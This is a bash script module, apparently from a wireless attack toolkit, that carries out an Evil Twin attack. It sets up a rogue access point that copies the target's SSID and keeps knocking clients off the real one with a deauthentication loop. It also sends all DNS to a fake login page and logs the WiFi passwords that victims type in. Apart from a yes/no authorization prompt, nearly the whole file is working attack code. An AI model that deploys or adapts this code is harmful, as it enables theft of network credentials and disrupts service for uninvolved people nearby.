# Evil Twin / Captive Portal Attack Implementation
#
# Creates a rogue access point mimicking the target network to capture credentials
# Uses hostapd for AP creation and dnsmasq for DHCP/DNS services with captive portal
#
# References:
# - https://github.com/FluxionNetwork/fluxion (Popular Evil Twin framework)
# - https://github.com/wifiphisher/wifiphisher (Automated phishing attacks)
# - https://www.aircrack-ng.org/doku.php?id=airbase-ng (Legacy airbase-ng method)
#
# Attack Flow:
# 1. Deauth clients from legitimate AP
# 2. Create rogue AP with same SSID
# 3. Clients auto-connect to rogue AP (stronger signal)
# 4. Redirect all traffic to captive portal
# 5. Harvest credentials from fake login page
#
# Requirements: hostapd, dnsmasq, apache2 or lighttpd

attack_evil_twin() {
    log_info "Starting Evil Twin attack on $TARGET_ESSID..."
    
    # Check required tools
    if ! command -v hostapd &> /dev/null || ! command -v dnsmasq &> /dev/null; then
        log_error "Required tools missing (hostapd, dnsmasq)"
        log_info "Install with: sudo apt install hostapd dnsmasq"
        return 1
    fi
    
    # Ethical warning
    echo ""
    log_warning "═════════════════════════════════════════════════════"
    log_warning "  EVIL TWIN ATTACK - ADVANCED MITM TECHNIQUE"
    log_warning "═════════════════════════════════════════════════════"
    echo ""
    echo "This attack creates a fake access point and intercepts traffic."
    echo "This is an AGGRESSIVE technique that affects innocent users."
    echo ""
    echo "Only proceed if:"
    echo "  • You have explicit written authorization"
    echo "  • This is in a controlled test environment"
    echo "  • You understand the legal implications"
    echo ""
    read -p "Do you have proper authorization for this attack? (yes/no): " confirm
    
    if [ "$confirm" != "yes" ]; then
        log_error "Attack cancelled - authorization not confirmed"
        return 1
    fi
    
    # Setup evil twin AP
    setup_evil_twin_ap
    
    # Start deauth attack on legitimate AP
    start_continuous_deauth &
    local deauth_pid=$!
    
    # Start captive portal
    setup_captive_portal
    
    # Monitor for captured credentials
    log_info "Evil Twin active - monitoring for credentials..."
    log_info "Press Ctrl+C to stop"
    
    monitor_captive_portal
    
    # Cleanup
    kill $deauth_pid 2>/dev/null || true
    cleanup_evil_twin
}

setup_evil_twin_ap() {
    log_info "Creating rogue access point..."
    
    # Create hostapd configuration
    cat > "$OUTPUT_DIR/hostapd_evil.conf" << EOF
interface=$MONITOR_INTERFACE
driver=nl80211
ssid=$TARGET_ESSID
channel=$TARGET_CHANNEL
hw_mode=g
ieee80211n=1
wmm_enabled=1
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
EOF
    
    # Configure network interface for AP
    ip addr flush dev "$MONITOR_INTERFACE"
    ip addr add 10.0.0.1/24 dev "$MONITOR_INTERFACE"
    ip link set "$MONITOR_INTERFACE" up
    
    # Start DHCP server
    cat > "$OUTPUT_DIR/dnsmasq_evil.conf" << EOF
interface=$MONITOR_INTERFACE
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1,10.0.0.1
# Redirect all DNS to captive portal
address=/#/10.0.0.1
EOF
    
    # Start services
    dnsmasq -C "$OUTPUT_DIR/dnsmasq_evil.conf" -d &
    hostapd "$OUTPUT_DIR/hostapd_evil.conf" > /dev/null 2>&1 &
    
    sleep 3
    log_success "Rogue AP created: $TARGET_ESSID"
}

setup_captive_portal() {
    log_info "Setting up captive portal..."
    
    # Create web directory
    mkdir -p "$OUTPUT_DIR/captive_portal"
    
    # Generate fake login page (embedded HTML)
    cat > "$OUTPUT_DIR/captive_portal/index.html" << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>WiFi Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: Arial; background: #f0f0f0; padding: 20px; }
        .container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        h2 { color: #333; text-align: center; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
        button:hover { background: #0056b3; }
        .note { font-size: 12px; color: #666; text-align: center; margin-top: 15px; }
    </style>
</head>
<body>
    <div class="container">
        <h2>WiFi Network Authentication</h2>
        <p style="text-align: center; color: #666;">Please enter the network password to continue</p>
        <form action="check.php" method="POST">
            <input type="text" name="ssid" value="NETWORK_SSID" readonly>
            <input type="password" name="password" placeholder="Network Password" required autofocus>
            <button type="submit">Connect</button>
        </form>
        <div class="note">Secure connection · Protected by WPA2</div>
    </div>
</body>
</html>
EOF
    
    # Replace SSID placeholder
    sed -i "s/NETWORK_SSID/$TARGET_ESSID/g" "$OUTPUT_DIR/captive_portal/index.html"
    
    # PHP handler for credential capture
    cat > "$OUTPUT_DIR/captive_portal/check.php" << 'EOF'
<?php
$password = $_POST['password'] ?? '';
$ssid = $_POST['ssid'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'] ?? '';

// Log credentials
$log = date('Y-m-d H:i:s') . " | SSID: $ssid | Password: $password | IP: $ip\n";
file_put_contents('credentials.txt', $log, FILE_APPEND);

// Redirect to fake "connecting" page
header('Location: connecting.html');
?>
EOF
    
    # Start simple web server (Python)
    cd "$OUTPUT_DIR/captive_portal"
    python3 -m http.server 80 > /dev/null 2>&1 &
    cd - > /dev/null
    
    log_success "Captive portal active on http://10.0.0.1"
}

start_continuous_deauth() {
    log_info "Starting continuous deauthentication..."
    
    while true; do
        aireplay-ng --deauth 5 -a "$TARGET_BSSID" "$MONITOR_INTERFACE" > /dev/null 2>&1
        sleep 10
    done
}

monitor_captive_portal() {
    local cred_file="$OUTPUT_DIR/captive_portal/credentials.txt"
    
    log_info "Monitoring for credential submissions..."
    
    # Monitor credential file
    timeout 3600 tail -f "$cred_file" 2>/dev/null &
    
    # Wait for credentials or timeout
    while [ ! -f "$cred_file" ] || [ ! -s "$cred_file" ]; do
        sleep 5
    done
    
    if [ -f "$cred_file" ] && [ -s "$cred_file" ]; then
        log_success "Credentials captured!"
        cat "$cred_file"
        
        # Copy to main results
        cp "$cred_file" "$OUTPUT_DIR/evil_twin_results.txt"
        
        STATS_EVIL_TWIN_CAPTURES=$((STATS_EVIL_TWIN_CAPTURES + 1))
    fi
}

cleanup_evil_twin() {
    log_info "Stopping Evil Twin attack..."
    
    # Kill services
    pkill hostapd
    pkill dnsmasq
    pkill -f "python3 -m http.server"
    
    # Restore interface
    ip addr flush dev "$MONITOR_INTERFACE"
    
    log_success "Evil Twin stopped"
}
